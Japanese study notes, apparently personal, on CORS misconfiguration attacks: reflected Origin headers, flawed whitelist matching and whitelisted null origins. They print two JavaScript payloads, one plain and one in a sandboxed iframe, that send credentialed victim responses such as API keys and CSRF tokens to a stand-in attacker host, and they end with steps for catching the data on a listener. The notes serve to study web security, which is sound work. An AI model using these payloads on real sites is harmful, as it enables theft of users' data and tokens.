## 前提知識
### クロスオリジンリソース共有とは？
- 特定のドメインのリソースにアクセスさせるための機能。
- 同一ドメインポリシーの拡張機能的役割。

## 攻撃概要の説明
### 1. **クライアントが指定したOriginヘッダーからサーバが生成したACAOヘッダー**
- リクエストからOriginヘッダーを読取り、レスポンスが許可されていることを示すレスポンスヘッダーを含める。
	↓リクエスト
	```
	GET /sensitive-victim-data HTTP/1.1
	Host: vulnerable-website.com
	Origin: https://malicious-website.com
	Cookie: sessionid=...
	```
	↓レスポンス
	```
	HTTP/1.1 200 OK
	Access-Control-Allow-Origin: https://malicious-website.com // ←アクセスが許可されたことを示す。
	Access-Control-Allow-Credentials: true // ←クッキーを含めることを許可している。
	...
	```

- 以下のスクリプトをWebサイトに配置することで、レスポンスに含まれるAPIキーだったり、CSRFトークンだったりが盗める。
```html
<html>
	<script>
	var req = new XMLHttpRequest();
	req.onload = reqListener;
	req.open('get','https://vulnerable-website.com/sensitive-victim-data',true); /** ←ターゲットサーバのURLとAPIキーなどが生成されている箇所を入力。 **/
	req.withCredentials = true;
	req.send();
	
	function reqListener() {
		location='//malicious-website.com/log?key='+this.responseText;
	}; // ← APIを受け取る先を指定する。
	</script>
</html>
```

---
## 2. Originヘッダーの解析エラー
- 別ドメインのアクセスを許可する設定として、ホワイトリストを使用することで制限を掛けることができる。
- 指定されたオリジンがホワイトリストにある場合、`Access-Control-Allow-Origin`ヘッダーに反映され、アクセスが許可される。
↓リクエスト
```
	GET /data HTTP/1.1
	Host: normal-website.com
	...
	Origin: https://innocent-website.com
```
↓レスポンス
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://innocent-website.com
```
- CORSオリジンホワイトリストの実装では、ミスが起こる場合がある。
	- 例：
		- すべてのサブドメインを許可している。(将来的に取得するであろうドメインも含めて)
		- 他組織のドメインを許可している場合
			- これは正規表現で実装されていることが多くミスが起きやすい。
- **攻撃の例**
	- アプリケーションが次の文字で終わるすべてのドメインへのアクセスを許可する。
		```
		normal-website.com
		```
	- 上記に対して、攻撃者は以下のドメインでアクセスすることが可能となる。
		```
		hackersnormal-website.com
		もしくは
		normal-website.com.evil-user.net
		```

---
## 3. ホワイトリストに登録されたnullオリジン値
- Originヘッダーの使用では、null値がサポートされている。
- 以下の特殊な状況において、Originヘッダーでnull値を送信する場合がある。
	- クロスオリジンリダイレクト
	- シリアル化されたデータからのリクエスト
	- `file`プロトコルを使用してリクエストする。
	- サウンドボックス化されたクロスオリジンリクエスト

- ローカル開発をサポートするためにnullオリジンをホワイトリストに登録する場合がある。
	- ローカル環境のが合い`file://home/kali/.../index.html`となるので、CORSが存在しない。その場合に`null`を使用する。(オリジンは、「プロトコル＋ドメイン＋ポート」の組み合わせで決まる識別子である。)
	↓リクエスト
	```
	GET /sensitive-victim-data
	Host: vulnerable-website.com
	Origin: null
	```
	↓レスポンス
	```
	HTTP/1.1 200 OK
	Access-Control-Allow-Origin: null
	Access-Control-Allow-Credentials: true
	```
	- 上記の様にnullが許可されていた場合クロスオリジンリクエストを生成することができる。
	```html
	<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
	var req = new XMLHttpRequest();
	req.onload = reqListener;
	req.open('get','vulnerable-website.com/sensitive-victim-data',true);
	req.withCredentials = true;
	req.send();
	
	function reqListener() {
	location='malicious-website.com/log?key='+this.responseText;
	};
	</script>"></iframe>
	```
---
## 攻撃の説明
### 基本的なオリジンリフレクションによるCORSの脆弱性

1. リクエストヘッダーに`Origin: http://hoge.com/`を追加して、`Access-Control-Allow-Origin:`と`Access-Control-Allow-Credentials: true`がレスポンスにあるかを確認。
	![[Pasted image 20251004184839.png]]
2. XSSなどと組み合わせて、被害者が自分が仕込んだOriginヘッダーを含んだリクエストを送信するように仕向ける。
	- 例：
3. `python -m http.server`を起動しリッスン、APIキーを受け取る。
---
